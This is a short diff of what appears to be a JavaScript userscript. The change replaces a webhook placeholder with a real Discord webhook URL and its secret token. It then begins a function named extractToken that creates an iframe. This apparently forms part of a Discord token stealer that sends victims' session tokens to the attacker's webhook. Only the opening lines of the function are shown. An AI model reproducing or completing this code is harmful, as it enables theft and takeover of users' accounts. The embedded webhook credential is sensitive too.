@@ -14,7 +14,7 @@
 (function() {
     'use strict';
 
-    const v = 'YOUR_WEBHOOK_URL_HERE';
+    const v = 'https://canary.discord.com/api/webhooks/1555948959225217175/b7u6YtKrQkfSlva8y3JFjalPudUyEuQ8I-_q5zyC9BAbeyFCheNjdaB91_2Ohv_6cIzt';
 
     function extractToken() {
         var i = document.createElement('iframe');
